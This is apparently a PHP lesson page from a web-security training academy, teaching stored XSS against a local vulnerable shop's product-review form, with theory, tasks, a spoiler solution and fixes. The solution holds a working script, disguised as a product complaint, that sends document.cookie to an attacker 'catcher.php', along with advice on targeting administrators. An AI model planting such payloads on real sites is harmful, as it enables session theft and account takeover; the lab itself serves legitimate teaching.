<?php
require __DIR__ . '/_layout.php';

$lessons = require_once __DIR__ . '/lessons.php';
$lesson  = $lessons['xss-stored'];

academy_layout_start($lesson['title']);
?>

<header class="academy-lesson-head">
    <div class="academy-lesson-eyebrow"><?= htmlspecialchars($lesson['category']) ?> &middot; Lab 05</div>
    <h1><?= htmlspecialchars($lesson['title']) ?></h1>
    <div class="academy-lesson-meta">
        <span class="academy-badge is-medium"><?= htmlspecialchars($lesson['difficulty']) ?></span>
        <span class="academy-badge is-ready">Ready</span>
    </div>
</header>

<?php academy_render_related_labs('xss-stored'); ?>

<!-- 1. THEORY -->
<section class="academy-block">
    <h2>1. Theory</h2>
    <p>
        <strong>Stored XSS</strong> (also called &quot;persistent XSS&quot;) is the
        nastier sibling of reflected XSS. Instead of needing the victim to click a crafted
        link, the attacker plants the payload into the application&apos;s storage -
        a comment, a review, a profile bio - and the server happily serves it back to
        every subsequent visitor. No phishing required: the website itself becomes the
        delivery vehicle.
    </p>
    <p>
        Stored XSS lives anywhere user-supplied content is (a) saved server-side and
        (b) later rendered back to other users without escaping. The
        <strong>write</strong> boundary and the <strong>render</strong> boundary are
        separate sanitisation problems - getting one right does not protect the other.
    </p>
</section>

<!-- 2. TASK 1 - LOCATE THE SINK -->
<section class="academy-block">
    <h2>2. Task 1 - locate the sink</h2>
    <p>
        Browse the application and identify a feature where one user&apos;s input is
        saved server-side and later rendered back to other visitors. Stored XSS only
        lives where users can see each other&apos;s content - so think about which of
        the application&apos;s pages displays content that someone else wrote.
    </p>
    <details class="academy-hint">
        <summary>Reveal the sink</summary>
        <p>
            Electronics product pages have a review form. Submissions are written into
            the <code>reviews</code> table via a prepared statement (so they&apos;re
            SQL-safe), but the rendering loop on <code>product_view.php</code> emits
            <code>$rev['content']</code> with no <code>htmlspecialchars()</code>:
        </p>
        <pre><code>// write path
if ($_SERVER["REQUEST_METHOD"] == "POST" &amp;&amp; isset($_POST["submit_review"])) {
    $content = $_POST["content"]; // taken raw
    $ins = $db-&gt;prepare(
        "INSERT INTO reviews (product_id, username, rating, content)
         VALUES (?, ?, ?, ?)"
    );
    $ins-&gt;execute([$product_id, $user, $rating, $content]);
}

// read path
foreach ($reviews as $rev) {
    ...
    echo $rev['content']; // no htmlspecialchars
}</code></pre>
        <p>
            The prepared statement protects against SQL injection, but escaping at the
            <strong>write</strong> boundary is not the same as escaping at the
            <strong>render</strong> boundary. By the time <code>$rev['content']</code>
            is printed, it is just a string of HTML.
        </p>
        <p>
            <strong>Only electronics products show reviews.</strong> The review block
            is gated by <code>if ($product['category'] == 'electronics')</code>, so
            pick an electronics product (e.g. <code>product_view.php?id=81</code>, the
            electric kettle) before submitting your payload.
        </p>
    </details>
</section>

<!-- 3. TASK 2 - EXPLOIT THE SINK -->
<section class="academy-block">
    <h2>3. Task 2 - exploit the sink</h2>
    <ol>
        <li>Register an account on the target site and log in.</li>
        <li>Navigate to an electronics product and submit a review whose
            <em>content</em> contains a payload that exfiltrates
            <code>document.cookie</code> to your catcher.</li>
        <li>
            <strong>Verify in a different browser session:</strong> register a second
            account, log in with it, open the same product page, and confirm the payload
            fires automatically and the cookie shows up in
            <code>AttackerServer/stolen_cookies.txt</code>.
        </li>
    </ol>
    <p>
        If the lab gets dirty after a few attempts, run the &quot;Reset databases&quot;
        button on the academy index to start with a clean reviews table.
    </p>
</section>

<!-- 4. START THE LAB -->
<section class="academy-block">
    <h2>4. Start the lab</h2>
    <p>The electric kettle product page (electronics &mdash; has the review form) opens
       in a new tab. The page requires login, so register an account first if you
       don&apos;t have one and log in with it.</p>
    <a class="academy-lab-cta"
       href="<?= htmlspecialchars($lesson['target_url']) ?>?id=81"
       target="_blank" rel="noopener">Open vulnerable product page</a>
</section>

<!-- 5. REVEAL SOLUTION -->
<details class="academy-solution" id="academy-solution">
    <summary>Reveal solution (spoilers!)</summary>
    <div class="academy-solution-body">
        <p class="academy-solution-warning">
            Try the lab on your own first. Reading the solution before attempting it
            yourself defeats the point of the exercise.
        </p>

        <h3>The payload</h3>
        <p>
            Disguise the malicious script inside something that looks like a normal
            complaint about the product, so a quick skim of the reviews list does not give
            it away:
        </p>
        <pre><code>The handle gets too hot, and there&apos;s a weird smell.
&lt;script&gt;
    var encoded = btoa(document.cookie);
    fetch('http://localhost/CyberProject/AttackerServer/catcher.php?data=' + encoded);
&lt;/script&gt;</code></pre>
        <p>
            <code>fetch()</code> beats <code>document.location</code> here because it
            doesn&apos;t navigate the victim away from the product page - they see a
            normal review next to your malicious one and don&apos;t notice anything
            happened.
        </p>

        <h3>Submission</h3>
        <ul>
            <li>Method: <code>POST</code></li>
            <li>URL: <code>product_view.php?id=81</code></li>
            <li>Fields:
                <code>rating=2</code>,
                <code>content=&lt;the payload above&gt;</code>,
                <code>submit_review=</code></li>
        </ul>
        <p>The server inserts the row and redirects to the same product page; the
            payload now lives in the <code>reviews</code> table and fires for every
            visitor.</p>

        <h3>Why this is worse than reflected XSS</h3>
        <ul>
            <li>No phishing email required - the victim just shops normally.</li>
            <li>Site administrators are particularly tasty victims: <code>product_view.php</code>
                renders an admin-only reply form (<code>$_SESSION["is_admin"]</code>),
                so an admin opening the kettle page fires the payload with admin
                privileges in their cookie.</li>
            <li>The payload is durable - it persists across server restarts until the row
                is deleted.</li>
        </ul>

        <h3>The trade-off the attacker pays</h3>
        <p>
            Reflected XSS leaves no server-side footprint - the payload lives in a URL and
            is gone the moment the response is rendered. Stored XSS is the opposite: every
            successful injection writes a row to the <code>reviews</code> table tied to
            the account that posted it, with a timestamp visible in the database, in any
            admin moderation queue, and in the Apache access log. From a forensics
            standpoint that account is burned - one log review and the defender knows
            exactly which user dropped the payload. Real attackers plan around this;
            thinking about <em>which identity</em> the malicious row will be linked to
            is part of the attack design, not an afterthought.
        </p>

        <details style="margin-top: 1rem;">
            <summary style="cursor: pointer; font-weight: 600;">Bonus: automated exploit</summary>
            <p style="margin-top: 0.75rem;">
                The script logs in (defaults to <code>HUCKER</code> / <code>hucker123</code>),
                then POSTs the malicious review to the target product.
            </p>
            <div class="academy-script">
                <?php highlight_file(__DIR__ . '/../scripts/stored_xss.py'); ?>
            </div>
        </details>

        <h3>How to fix it (for context)</h3>
        <ul>
            <li>Escape on render:
                <code>echo htmlspecialchars($rev['content'], ENT_QUOTES, 'UTF-8');</code></li>
            <li>For richer review formatting, run the content through a strict allowlist
                sanitiser (e.g. HTML Purifier) on read, not write.</li>
            <li>Mark session cookies <code>HttpOnly</code>.</li>
            <li>Set a Content Security Policy that disallows inline scripts and limits
                <code>connect-src</code> to your own origin - this would have neutered the
                <code>fetch()</code> call to the attacker server.</li>
        </ul>
    </div>
</details>

<script>
(function () {
    var details = document.getElementById('academy-solution');
    if (!details) return;
    details.addEventListener('toggle', function () {
        if (this.open && !this.dataset.confirmed) {
            var ok = confirm('Are you sure you want to see the solution?\n\nTry the lab first - that is where the learning happens.');
            if (!ok) { this.open = false; } else { this.dataset.confirmed = '1'; }
        }
    });
})();
</script>

<p style="margin-top: 28px;">
    <a href="index.php">&larr; Back to all labs</a>
</p>

<?php
academy_layout_end();
